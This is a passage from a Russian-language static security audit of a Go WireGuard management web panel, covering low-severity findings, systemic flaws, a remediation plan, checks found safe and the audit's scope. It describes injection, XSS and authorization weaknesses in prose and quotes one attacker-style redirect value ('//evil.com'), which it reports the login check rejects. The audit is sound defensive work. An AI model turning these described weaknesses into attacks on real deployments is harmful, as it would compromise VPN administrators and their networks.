**Как исправить:** разделить привилегированную часть (применение конфига) и веб-часть, либо явно
задокументировать, что панель обязана быть недоступна из недоверенных сетей. Из compose-примера
пароль убрать в `.env`.

---

### 19. Прочие замечания низкой серьёзности

* **`GET /about` доступен без аутентификации** (`main.go:236`) и раскрывает версию и git-коммит —
  упрощает подбор известных уязвимостей.
* **`GET /logout` меняет состояние** и при `SameSite=Lax` выполняется межсайтово: сторонняя
  страница может разлогинивать администратора.
* **Подробные внутренние ошибки в JSON-ответах**: `err.Error()` возвращается клиенту в
  `UpdateUser`, `CreateUser`, `ApplyServerConfig`, `SaveWakeOnLanHost` и др. — раскрываются пути
  файловой системы и детали БД.
* **`Content-Disposition` из непроверенного имени клиента** (`handler/routes.go:800`):
  `fmt.Sprintf("attachment; filename=%s.conf", clientData.Client.Name)`. Перевод строки Go
  вырезает сам, но кавычки и `;` позволяют влиять на имя сохраняемого файла.
* **CRC32 как признак изменения учётной записи** (`util/util.go:843`): 32-битная контрольная сумма
  без криптографических свойств используется для инвалидации сессий. Заменить на SHA-256.
* **`GetAllocatedIPs` создаёт новый `scribble.Driver` при каждом вызове** и с жёстко зашитым путём
  `"./db"` (`util/util.go:263-270`), игнорируя настроенный. Каждый экземпляр драйвера имеет
  собственные мьютексы, поэтому блокировки записи между экземплярами не работают.
* **`LookupEnvOrFile` не закрывает файл** (`util/util.go:687`) и склеивает строки без разделителя.
* **`CreateUser` не требует непустого пароля** — можно создать учётную запись с пустым паролем,
  которая пройдёт вход по пустой строке.
* **`UpdateUser` выполняет `DeleteUser` + `SaveUser` без транзакции** (`handler/routes.go:257-263`):
  сбой на втором шаге безвозвратно удаляет пользователя.

---

## Системные проблемы

1. **Выбран не тот шаблонизатор.** `text/template` для HTML — корень находок 2 и части 3. В Go
   безопасный вариант (`html/template`) доступен из коробки и совместим по синтаксису.
2. **Валидация ввода не выполняется системно.** Зарегистрирован `validator.v9`, но `c.Validate()`
   не вызывается ни в одном обработчике; в моделях нет тегов `validate`. Проверяются только IP/CIDR
   и ключи WireGuard — то есть ровно те поля, где ошибка сразу ломает функциональность, а не
   безопасность.
3. **Доверие к данным, дошедшим до генерации конфига.** Экранирование сделано «точечно» (только
   заметки) вместо общего правила «ни одно поле не может содержать перевод строки».
4. **Границы привилегий заданы одним булевым флагом**, который к тому же берётся из cookie, а не из
   БД. Роль «менеджера» описана неявно, и проверки `NeedsAdmin` расставлены вручную — отсюда
   пропуски (находка 8).
5. **Небезопасные значения по умолчанию:** `admin`/`admin`, `0.0.0.0`, без TLS, случайный секрет
   сессий из `math/rand`, каталоги `0777`. Безопасная конфигурация требует ручных действий,
   описанных только в README.
6. **Конкурентность не продумана.** Четыре глобальные карты, мьютекс — у одной. Тестов нет,
   `-race` в CI нет.
7. **В CI нет средств безопасности.** Только стилевые линтеры; ни SAST, ни сканирования
   зависимостей, ни пиннинга экшенов.

---

## План устранения

### Немедленно (сегодня)

1. Запретить управляющие символы в `Name`, `Email`, `Endpoint` клиента и в `Name` WoL-хоста —
   и на входе, и при рендеринге `wg.conf` (**находка 1**).
2. Заменить `text/template` на `html/template` в `router/router.go`, поправить `status.html`
   (**находка 2**).
3. Экранировать данные в `custom/js/helper.js` и `custom/js/wake_on_lan_hosts.js`
   (**находка 3**).
4. Перевести `RandomString` на `crypto/rand`; во всех развёрнутых инсталляциях задать
   `SESSION_SECRET` явно (**находка 4**).
5. Добавить `handler.NeedsAdmin` на `/api/apply-wg-config` и WoL-маршруты (**находка 8**).
6. Открывать `wg0.conf` с режимом `0600` (**находка 7**).

### В ближайшем спринте

7. Закрыть мьютексами `IPToSubnetRange`, `DBUsersToCRC32`, `floodWait`/`floodMessageSent`
   (**находка 5**).
8. Подключить `middleware.Recover()`, `middleware.Secure*`, `middleware.RateLimiter` на `/login`,
   `middleware.BodyLimit`; выставить таймауты HTTP-сервера (**находки 6, 11, 14**).
9. Убрать `password`/`password_hash` из ответов API; принудительно хэшировать legacy-пароли
   (**находка 10**).
10. Добавить `Secure` к cookie; вход по умолчанию требует смены пароля `admin`
    (**находки 6, 9**).
11. Валидировать ID в `SendTelegramClient`, санитизировать пути в слое `jsondb`; проверять `nil`
    в `WakeOnHost`; `os.MkdirAll(..., 0700)` (**находки 12, 13, 15**).
12. Закрепить GitHub Actions по SHA, добавить `permissions:`, обновить версию Go в релизном
    workflow (**находка 16**).

### Долгосрочно / архитектурно

13. Перейти на декларативную валидацию: теги `validate` в моделях + `c.Validate()` в каждом
    обработчике; заменить `map[string]interface{}` + type assertion на типизированные DTO.
14. Заменить булев `admin` на явную модель ролей и разрешений; источником истины сделать БД,
    а не cookie.
15. Разделить привилегии: веб-процесс без root, применение конфигурации — через отдельный
    минимальный агент.
16. Атомарная запись `wg0.conf` (temp + `rename`) с проверкой результата.
17. Ввести в CI `govulncheck`, `gosec`, `-race`, Dependabot; написать тесты на авторизацию
    и на генерацию конфига.
18. Рассмотреть замену scribble на встраиваемую БД с нормальной блокировкой и без построения
    путей из идентификаторов.

---

## Что проверено и признано безопасным

* **Защита от CSRF через `Content-Type` работает.** `handler.ContentTypeJson` действительно
  эффективна: браузер не даёт выставить `Content-Type: application/json` в межсайтовом запросе без
  preflight, а CORS-middleware в приложении нет — значит preflight не пройдёт. Middleware
  корректно навешана на все `POST`/`PUT`/`DELETE`. Единственный пробел — `GET /logout`
  (см. находку 19).
* **Открытого редиректа на странице входа нет.** Параметр `next` проверяется регулярным
  выражением `/(?:^\/[a-zA-Z_])|(?:^\/$)/`, которое отсекает `//evil.com` и схемы.
* **Обхода каталога через имя пользователя нет.** `usernameRegexp = ^\w[\w\-.]*$` запрещает `/`
  и не позволяет имени начинаться с точки.
* **MAC-адреса WoL валидируются** через `net.ParseMAC` в `WakeOnLanHost.ResolveResourceName`, а
  magic-пакет уходит только на `255.255.255.255` — произвольный адрес назначения задать нельзя.
* **В Go-коде нет `os/exec`** — приложение само команд не выполняет; выполнение появляется только
  через `wg-quick`, который вызывает `init.sh`.
* **Ключи WireGuard генерируются корректно** — `wgtypes.GeneratePrivateKey()` использует
  `crypto/rand`; идентификаторы клиентов — `xid`.
* **Хэширование паролей корректно** — bcrypt с cost 14, сравнение legacy-пароля выполняется через
  `subtle.ConstantTimeCompare`.
* **Инъекция CRLF в HTTP-заголовки невозможна** — `net/http` заменяет `\r` и `\n` пробелами при
  записи значений заголовков (актуально для `Content-Disposition` и редиректа на `/login`).
* **Экранирование `AdditionalNotes` в `wg.conf` достаточно** для `\n`; одиночный `\r` парсер
  `wg-quick` разделителем строк не считает.

---

## Границы аудита

* Только статический анализ исходного кода. Работающий экземпляр не разворачивался, эксплойты не
  выполнялись; сценарии атак выведены из чтения кода и документированного поведения `wg-quick`,
  Echo, `gorilla/sessions` и Go `net/http`.
* Динамическое тестирование не проводилось: ни фаззинга, ни DAST, ни проверки под нагрузкой,
  ни запуска с детектором гонок (`-race`).
* Сопоставление зависимостей с уязвимостями сделано по закреплённым версиям, без запуска
  `govulncheck`/`yarn audit` (инструменты в среде аудита недоступны). Раздел 17 требует
  инструментальной перепроверки.
* Не анализировался код зависимостей (в частности, внутренности `scribble`, `echotron`,
  `go-simple-mail`) — только их интерфейсы и способ использования. Вывод об отсутствии санитизации
  путей в scribble сделан по способу построения пути из `collection`/`resource`.
* Вне области: инфраструктура развёртывания конкретных пользователей, конфигурация обратного
  прокси, безопасность самого протокола WireGuard, реестры Docker Hub и учётные записи
  сопровождающих.
* Аудит охватывает состояние ветки `master` на коммите `2fdafd3`. Более поздние изменения апстрима
  не учитывались.
